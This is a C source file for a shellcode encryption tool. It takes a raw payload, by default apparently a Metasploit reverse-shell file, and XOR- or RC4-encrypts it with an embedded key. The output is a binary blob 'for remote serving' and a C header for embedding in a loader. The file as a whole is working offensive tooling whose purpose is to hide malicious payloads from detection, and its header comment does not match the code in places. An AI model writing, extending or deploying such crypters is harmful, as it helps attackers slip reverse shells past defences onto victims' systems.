/*
 * Shellcode Encryption Tool
 * Encrypts raw shellcode with random XOR key, outputs in SCLD format.
 *
 * SCLD Format (binary):
 *   [4] magic  "SCLD" (0x444C4353 LE)
 *   [1] ver    0x01
 *   [1] algo   0x00 = XOR-16
 *   [2] keylen uint16 LE
 *   [N] key    N bytes
 *   [4] paylen uint32 LE
 *   [M] data   encrypted payload
 *
 * The key is embedded IN the file — the loader doesn't need to know it
 * ahead of time. Any shellcode can be encrypted, and the loader will
 * decrypt it using the key from the header.
 *
 * Outputs:
 *   enc_shellcode.bin — SCLD format for remote serving
 *   enc_shellcode.h   — C arrays for embedding (key + data separate)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <stdint.h>

static void write_le16(FILE *f, uint16_t v) { fwrite(&v, 2, 1, f); }
static void write_le32(FILE *f, uint32_t v) { fwrite(&v, 4, 1, f); }

/* RC4 implementation (same as loader for consistency) */
typedef struct { unsigned char S[256]; int i, j; } rc4_ctx;

static void rc4_init(rc4_ctx *c, const unsigned char *k, int kl) {
    for (int i = 0; i < 256; i++) c->S[i] = (unsigned char)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + c->S[i] + k[i % kl]) & 0xFF;
        unsigned char t = c->S[i]; c->S[i] = c->S[j]; c->S[j] = t;
    }
    c->i = c->j = 0;
}

static void rc4_crypt(rc4_ctx *c, unsigned char *d, int len) {
    for (int n = 0; n < len; n++) {
        c->i = (c->i + 1) & 0xFF;
        c->j = (c->j + c->S[c->i]) & 0xFF;
        unsigned char t = c->S[c->i]; c->S[c->i] = c->S[c->j]; c->S[c->j] = t;
        d[n] ^= c->S[(c->S[c->i] + c->S[c->j]) & 0xFF];
    }
}

int main(int argc, char **argv) {
    unsigned char key[32];
    unsigned char *buf = NULL;
    size_t size = 0;
    int algo = 0;           /* 0=XOR-16, 1=RC4 */
    int keylen = 16;        /* key length */
    const char *infile  = "shellcode/msf_rev_raw.bin";
    const char *out_h   = "enc_shellcode.h";
    const char *out_bin = "enc_shellcode.bin";

    if (argc >= 2) infile  = argv[1];
    if (argc >= 3) out_h   = argv[2];
    if (argc >= 4) out_bin = argv[3];

    /* Parse options: --rc4 for RC4, --xor for XOR (default) */
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--rc4") == 0) { algo = 1; keylen = 16; }
        if (strcmp(argv[i], "--xor") == 0) { algo = 0; keylen = 16; }
    }

    /* Read raw shellcode */
    FILE *in = fopen(infile, "rb");
    if (!in) { perror(infile); return 1; }
    fseek(in, 0, SEEK_END);
    size = ftell(in);
    fseek(in, 0, SEEK_SET);
    if (size == 0) { fprintf(stderr, "Empty\n"); fclose(in); return 1; }
    buf = malloc(size);
    if (fread(buf, 1, size, in) != size) { perror("read"); fclose(in); free(buf); return 1; }
    fclose(in);

    /* Generate random key */
    srand(time(NULL) ^ (getpid() << 8));
    for (int i = 0; i < keylen; i++) key[i] = rand() % 256;

    /* Encrypt */
    if (algo == 1) {
        rc4_ctx ctx;
        rc4_init(&ctx, key, keylen);
        rc4_crypt(&ctx, buf, (int)size);
    } else {
        for (size_t i = 0; i < size; i++) buf[i] ^= key[i % keylen];
    }

    /* ---- SCLD binary format ---- */
    FILE *bin = fopen(out_bin, "wb");
    if (!bin) { perror(out_bin); free(buf); return 1; }
    fwrite("SCLD", 1, 4, bin);
    fputc(1, bin);                    /* version */
    fputc(algo, bin);                 /* algorithm */
    write_le16(bin, (uint16_t)keylen);
    fwrite(key, 1, keylen, bin);
    write_le32(bin, (uint32_t)size);
    fwrite(buf, 1, size, bin);
    fclose(bin);
    printf("[+] SCLD %s: %s (%zu bytes)\n",
           algo == 1 ? "RC4" : "XOR", out_bin, (size_t)12 + keylen + size);

    /* ---- C header (for embedding) ---- */
    FILE *hdr = fopen(out_h, "w");
    if (!hdr) { perror(out_h); free(buf); return 1; }
    fprintf(hdr, "/* Encrypted shellcode (algo=%d, keylen=%d) */\n", algo, keylen);
    fprintf(hdr, "#ifndef ENC_SHELLCODE_H\n#define ENC_SHELLCODE_H\n\n");
    fprintf(hdr, "static const unsigned char enc_key[%d] = {", keylen);
    for (int i = 0; i < keylen; i++) fprintf(hdr, "0x%02x%s", key[i], i<keylen-1?",":"};\n\n");
    fprintf(hdr, "static const unsigned char enc_shellcode[%zu] = {\n", size);
    for (size_t i = 0; i < size; i++) {
        if (i % 16 == 0) fprintf(hdr, "    ");
        fprintf(hdr, "0x%02x", buf[i]);
        if (i < size - 1) fprintf(hdr, ",");
        if ((i + 1) % 16 == 0) fprintf(hdr, "\n");
    }
    fprintf(hdr, "\n};\n\n");
    fprintf(hdr, "static const size_t enc_shellcode_len = %zu;\n\n", size);
    fprintf(hdr, "#endif\n");
    fclose(hdr);
    printf("[+] C header: %s\n", out_h);

    free(buf);
    return 0;
}
